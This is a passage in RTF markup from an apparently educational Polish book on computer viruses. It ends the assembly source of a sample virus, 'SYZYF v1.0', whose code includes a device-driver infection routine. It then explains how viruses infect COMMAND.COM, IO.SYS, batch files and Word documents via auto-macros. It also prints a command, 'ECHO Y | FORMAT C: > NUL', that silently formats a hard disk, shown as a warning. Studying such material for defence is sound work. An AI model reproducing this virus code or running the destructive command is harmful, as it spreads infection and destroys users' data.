\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     int   10h                             ;}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     jmp   short NastepnyZnak}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch InformacjaTxtOK:}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     mov   ah,0}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     int   16h}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     and   al,11011111b                     ; konwertuj znak na wielka litere}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     cmp   al,'T'                           ; czy potwierdzona infekcja}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     clc                                    ; ustaw flage na TAK}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     je    CLCRet                           ; TAK i powrot}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     stc                                    ; ustaw flage na NIE i powrot}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch CLCRet:}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     pop  si ax}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     ret                                    ; powrot}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch TeInformacja db CR,LF,'SYZYF v1.0, Autor : Adam Blaszczyk 1997'}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch              db CR,LF}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch              db CR,LF,'Czy chcesz uruchomic wirusa (T/N) ?'}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch              db CR,LF,NUL}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch              StarePrzerwanie dw offset Nosiciel}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch VirusEnd:}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch NoweDTA        DTAStruc <?,?,?,?,?,?>}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch DTASegOfs      dd ?}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch CzytNagl       NAGL <>}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ProceduraStrategii:                        ; na wejsciu ES:BX adres}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                                            ; do pakietu zlecenia}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     mov    word ptr cs:[AdresZlecenia],bx  ; \\ pobierz adres i zachowaj}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     mov    word ptr cs:[AdresZlecenia+2],es; / go na pozniej}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     retf                                   ; powrot z procedury}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                                            ; strategii}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch AdresZlecenia  dd ?}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Nosiciel:}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     push   ds ax bx}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     lds    bx,dword ptr cs:[AdresZlecenia] ; pobierz adres pakietu}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                                            ; zlecenia}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     xor    ax,ax                           ;}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     mov    word ptr ds:[bx+0Eh],ax         ;}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     mov    word ptr ds:[bx+10h],cs         ;}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     mov    byte ptr ds:[bx+0Dh],1          ;}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     mov    word ptr ds:[bx+03h],8102h      ;}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     pop    bx ax ds}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     retf}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch SYZYF ENDS}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch       END Start}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f1\fs24\b\lang1045{\*\listtag0}\abinodiroverride\ltrch 4.1.4. Pliki systemowe DOS}{\f1\fs24\b\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\b\lang1045{\*\listtag0}\abinodiroverride\ltrch 4.1.4.1. Interpretator polece\uc1\u324\'f1}{\f0\fs24\b\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Infekcja interpretatora polece\uc1\u324\'f1 (najcz\uc1\u281\'ea\uc1\u347\'9cciej plik COMMAND.COM) w zasadzie przebiega tak samo jak w przypadku innych plik\'f3w COM lub EXE (tylko we wcze\uc1\u347\'9cniejszych wersjach systemu DOS plik ten by\uc1\u322\'b3 typu COM). Szybkie infektory najcz\uc1\u281\'ea\uc1\u347\'9cciej szukaj\uc1\u261\'b9 w otoczeniu programu \uc1\u322\'b3a\uc1\u324\'f1cucha COMSPEC, b\uc1\u281\'ead\uc1\u261\'b9cego zmienn\uc1\u261\'b9 \uc1\u347\'9cro}{\f1\fs24\lang1045{\*\listtag0}d}{\f0\fs24\lang1045{\*\listtag0}owiskow\uc1\u261\'b9 systemu DOS, zawieraj\uc1\u261\'b9c\uc1\u261\'b9 pe\uc1\u322\'b3n\uc1\u261\'b9 nazw\uc1\u281\'ea (\uc1\u322\'b3\uc1\u261\'b9cznie ze \uc1\u347\'9ccie\uc1\u380\'bfk\uc1\u261\'b9) interpretatora polece\uc1\u324\'f1, i po znalezieniu od razu go infekuj\uc1\u261\'b9.}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Inny spos\'f3b dotarcia do pliku interpretatora polece\uc1\u324\'f1 polega na zamazaniu cz\uc1\u281\'ea\uc1\u347\'9cci jego kodu, le\uc1\u380\'bf\uc1\u261\'b9cego w pami\uc1\u281\'eaci s\uc1\u322\'b3u\uc1\u380\'bf\uc1\u261\'b9cej do analizowania i wykonywania polece\uc1\u324\'f1. W rezultacie przy wykonywaniu jakiego\uc1\u347\'9c polecenia z poziomu systemu DOS plik z interpretatorem polece\uc1\u324\'f1 b\uc1\u281\'eadzie musia\uc1\u322\'b3 zosta\uc1\u263\'e6 ponownie za\uc1\u322\'b3adowany do pami\uc1\u281\'eaci, a wtedy wirus b\uc1\u281\'eadzie m\'f3g\uc1\u322\'b3 go zainfekowa\uc1\u263\'e6. Zara\uc1\u380\'bfaj\uc1\u261\'b9c interpretator pol}{\f1\fs24\lang1045{\*\listtag0}e}{\f0\fs24\lang1045{\*\listtag0}ce\uc1\u324\'f1 warto pami\uc1\u281\'eata\uc1\u263\'e6 o tym, i\uc1\u380\'bf posiada on na swym ko\uc1\u324\'f1cu pusty (wype\uc1\u322\'b3niony zerami) obszar przeznaczony na stos, kt\'f3ry jest na tyle d\uc1\u322\'b3ugi, i\uc1\u380\'bf mo\uc1\u380\'bfna go wykorzysta\uc1\u263\'e6, aby wpisa\uc1\u263\'e6 tam kod wirusa, co umo\uc1\u380\'bfliwi wirusowi zainfekowanie go i przez to pozostawi\uc1\u263\'e6 d\uc1\u322\'b3ugo\uc1\u347\'9c\uc1\u263\'e6 }{\f1\fs24\lang1045{\*\listtag0}p}{\f0\fs24\lang1045{\*\listtag0}liku niezmienion\uc1\u261\'b9 (pomimo zmienionej zawarto\uc1\u347\'9cci).}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\b\lang1045{\*\listtag0}\abinodiroverride\ltrch 4.1.4.2. J\uc1\u261\'b9dro systemu (ang. kernel infector)}{\f0\fs24\b\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch J\uc1\u261\'b9dro systemu zawarte jest najcz\uc1\u281\'ea\uc1\u347\'9cciej w pliku IO.SYS, cho\uc1\u263\'e6 zale\uc1\u380\'bfy to od konkretnej realizacji systemu. Pomimo swego rozszerzenia plik IO.SYS nie jest typowym sterownikiem, jakie zwykle zawarte s\uc1\u261\'b9 w plikach SYS, lecz programem o strukturze bardziej przypominaj\uc1\u261\'b9cej pliki COM lub EXE, tak wi\uc1\u281\'eac pr\'f3by infekowania go jako s}{\f1\fs24\lang1045{\*\listtag0}t}{\f0\fs24\lang1045{\*\listtag0}erownika SYS spowoduj\uc1\u261\'b9 jego zniszczenie i w efekcie zawieszenie systemu po starcie komputera. Wirusy infekuj\uc1\u261\'b9ce plik IO.SYS najcz\uc1\u281\'ea\uc1\u347\'9cciej zapami\uc1\u281\'eatuj\uc1\u261\'b9 pocz\uc1\u261\'b9tek pliku w innym miejscu na dysku (najcz\uc1\u281\'ea\uc1\u347\'9cciej w jaki\uc1\u347\'9c spos\'f3b ukrytym), a na pocz\uc1\u261\'b9tek pliku IO.SYS na}{\f1\fs24\lang1045{\*\listtag0}d}{\f0\fs24\lang1045{\*\listtag0}pisuj\uc1\u261\'b9 sw\'f3j kod. Po starcie systemu}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch program zawarty w BOOT-sektorze, \uc1\u322\'b3aduje zainfekowany plik. Sterowanie przekazywane jest do wirusa, kt\'f3ry po instalacji wczytuje oryginaln\uc1\u261\'b9 zawarto\uc1\u347\'9c\uc1\u263\'e6 pliku i oddaje do niego sterowanie.}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f1\fs24\b\lang1045{\*\listtag0}\abinodiroverride\ltrch 4.1.5. Pliki wsadowe BAT}{\f1\fs24\b\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f1\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Wirusy typ}{\f0\fs24\lang1045{\*\listtag0}u batch nie s\uc1\u261\'b9 programami komputerowymi, lecz skryptami, kt\'f3re modyfikuj\uc1\u261\'b9 pliki o rozszerzeniu BAT. Na kod takiego wirusa mog\uc1\u261\'b9 si\uc1\u281\'ea sk\uc1\u322\'b3ada\uc1\u263\'e6:}{\f1\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f1\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch > polecenia: CALL, CD, COPY, DEL, DIR, ECHO, FOR, GOTO, IF/}{\f1\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f1\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     REM, RD, REN, SET, SHIFT, TYPE;}{\f1\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch > parametry wej\uc1\u347\'9c}{\f1\fs24\lang1045{\*\listtag0}ciowe: %0 nazwa programu, %1-%9 parametry}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f1\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     programu;}{\f1\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch > operatory zmiany przyporz\uc1\u261\'b9dkowania strumieni wej\uc1\u347\'9cciowych i}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     wyj\uc1\u347\'9cciowych: <, >, \'bb, |;}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch > nazwy zarezerwowane przez system DOS: urz\uc1\u261\'b9dzenie NUL;}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f1\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch > programy tradycyjnie dostarczane z systemem DOS: debugger DEBUG, ATTRIB, }{\f1\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f1\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     FIND, FORMAT; sterownik ANSI.SYS;}{\f1\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch > pola etykiet, wykorzystywane np. do pomini\uc1\u281\'eacia linii, w kt\'f3rej mo\uc1\u380\'bfe by\uc1\u263\'e6 kod }{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     maszynowy (opisane w jednym z poprzednich rozdzia\uc1\u322\'b3\'f3w).}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Na uwag\uc1\u281\'ea zas\uc1\u322\'b3uguj\uc1\u261\'b9 wspomniane wy\uc1\u380\'bfej operatory zmiany przyporz\uc1\u261\'b9dkowania strumieni wyj\uc1\u347\'9cciowych. Ich dzia\uc1\u322\'b3anie mo\uc1\u380\'bfe bowiem zosta\uc1\u263\'e6 wykorzystane do do\uc1\u347\'9c\uc1\u263\'e6 brutalnej destrukcji. Normalnie u\uc1\u380\'bfycie polecenia FORMAT C: czy DEL *.* wymaga potwierdzenia przez u\uc1\u380\'bfytkownika, kt\'f3ry mo\uc1\u380\'bfe zgodzi\uc1\u263\'e6 si\uc1\u281\'ea lub nie na dokonywan\uc1\u261\'b9 operacj\uc1\u281\'ea}{\f1\fs24\lang1045{\*\listtag0}.}{\f0\fs24\lang1045{\*\listtag0} Zmiana przyporz\uc1\u261\'b9dkowania strumieni umo\uc1\u380\'bfliwia zasymulowanie naci\uc1\u347\'9cni\uc1\u281\'eacia przez u\uc1\u380\'bfytkownika jakiego\uc1\u347\'9c klawisza (lub ich sekwencji), w tym wypadku potwierdzaj\uc1\u261\'b9cych dan\uc1\u261\'b9 operacj\uc1\u281\'ea. W efekcie polecenie zacznie si\uc1\u281\'ea wykonywa\uc1\u263\'e6 bez \uc1\u380\'bfadnej kontroli ze strony u\uc1\u380\'bfytkown}{\f1\fs24\lang1045{\*\listtag0}ika!}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Poza tym, skierowanie wszystkich komunikat\'f3w do urz\uc1\u261\'b9dzenia NUL mo\uc1\u380\'bfe spowodowa\uc1\u263\'e6, i\uc1\u380\'bf o wykonywanych operacjach u\uc1\u380\'bfytkownik dowie si\uc1\u281\'ea dopiero po ich zako\uc1\u324\'f1czeniu.}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Przyk\uc1\u322\'b3adem mo\uc1\u380\'bfe by\uc1\u263\'e6 poni\uc1\u380\'bfsze polecenie, po kt\'f3rego wykonaniu dysk twardy zostanie sformatowany}{\f1\fs24\lang1045{\*\listtag0}.}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f1\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ECHO Y | FORMAT C:    NUL}{\f1\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Powy\uc1\u380\'bfszy przyk\uc1\u322\'b3ad powinien przekona\uc1\u263\'e6 ka\uc1\u380\'bfdego o celowo\uc1\u347\'9cci przegl\uc1\u261\'b9dania nieznanych plik\'f3w wsadowych przed ich pochopnym uruchomieniem, aby uchroni\uc1\u263\'e6 si\uc1\u281\'ea przed niezbyt mi\uc1\u322\'b3ymi konsekwencjami.}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f1\fs24\b\lang1045{\*\listtag0}\abinodiroverride\ltrch 4.1.6. Pliki DOC}{\f1\fs24\b\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Pliki DOC s\uc1\u261\'b9 tworzone przez popularny edytor tekst\'f3w MS Word. Wirusy przemieszczaj\uc1\u261\'b9ce si\uc1\u281\'ea w tych plikach wykorzystuj\uc1\u261\'b9 j\uc1\u281\'eazyk Word Basie, wbudowany w ten program. Przy jego pomocy u\uc1\u380\'bfytkownik mo\uc1\u380\'bfe tworzy\uc1\u263\'e6 w\uc1\u322\'b3asne lub te\uc1\u380\'bf przedefiniowywa\uc1\u263\'e6 ju\uc1\u380\'bf istniej\uc1\u261\'b9ce makra-Wirusy atakuj\uc1\u261\'b9ce dokume}{\f1\fs24\lang1045{\*\listtag0}n}{\f0\fs24\lang1045{\*\listtag0}ty Worda wykorzystuj\uc1\u261\'b9 fakt, i\uc1\u380\'bf program ten ma kilka zdefiniowanych makr o specjalnym, wyja\uc1\u347\'9cnionym w tabeli poni\uc1\u380\'bfej, znaczeniu, kt\'f3rych przej\uc1\u281\'eacie umo\uc1\u380\'bfliwia zainfekowanie ka\uc1\u380\'bfdego otwieranego lub zamykanego dokumentu.}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f1\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Przy wczytywaniu zainfekowanego dokumentu}{\f0\fs24\lang1045{\*\listtag0} uruchamiane jest na przyk\uc1\u322\'b3ad makro AutoOpen, kt\'f3re kopiuje wszystkie zdefiniowane w wirusie makra do pliku NORMAL.DOT (globalny szablon zawieraj\uc1\u261\'b9cy definicje wszystkich podstawowych styl\'f3w, makr itd., u\uc1\u380\'bfywanych w edytorze). Od tej chwili ka\uc1\u380\'bfdy otwierany,}{\f1\fs24\lang1045{\*\listtag0} }{\f0\fs24\lang1045{\*\listtag0}zachowywany (zale\uc1\u380\'bfy to od przej\uc1\u281\'eatego makra) plik DOC b\uc1\u281\'eadzie zara\uc1\u380\'bfany. Infekcja polega na przerobieniu pliku DOC na DOT (czyli na plik zawieraj\uc1\u261\'b9cy szablon) i dopisaniu do niego makr wirusa. Operacja ta musi by\uc1\u263\'e6 wykonywana, poniewa\uc1\u380\'bf zwyk\uc1\u322\'b3y plik DOC nie mo\uc1\u380\'bfe}{\f1\fs24\lang1045{\*\listtag0} }{\f0\fs24\lang1045{\*\listtag0}zawiera\uc1\u263\'e6 w sobie definicji makr.}{\f1\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f1\fs24\b\lang1045{\*\listtag0}\abinodiroverride\ltrch Makra MS Word o ustalonym znaczeniu}{\*\abitableprops table-col-spacing:0.02in; table-column-leftpos:-0.0486in; table-column-props:1.3078in/5.2807in/; table-sdh:89454a0}\par{\*\abicellprops left-attach:0; right-attach:1; top-attach:0; bot-attach:1; bot-style:none; left-style:none; right-style:none; top-style:none}{
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx1827\clvertalt\cltxlrtb    \cellx9431
\pard\plain\ltrpar\ql\sl240\slmult1\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}Nazwa makra}\cell{\*\abiendcell}{\*\abicellprops left-attach:1; right-attach:2; top-attach:0; bot-attach:1; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}Opis makra}\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:1; bot-attach:2; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx1827\clvertalt\cltxlrtb    \cellx9431
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}AutoExec}\cell{\*\abiendcell}{\*\abicellprops left-attach:1; right-attach:2; top-attach:1; bot-attach:2; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}uruchamiane podczas rozpoczynania rozpoczynania pracy z Wordem z szablonu globalnego zawartego w pliku NORMAL.DAT}\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:2; bot-attach:3; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx1827\clvertalt\cltxlrtb    \cellx9431
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}AutoNew }\cell{\*\abiendcell}{\*\abicellprops left-attach:1; right-attach:2; top-attach:2; bot-attach:3; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}uruchamiane podczas tworzenia nowego dokumentu}\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:3; bot-attach:4; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx1827\clvertalt\cltxlrtb    \cellx9431
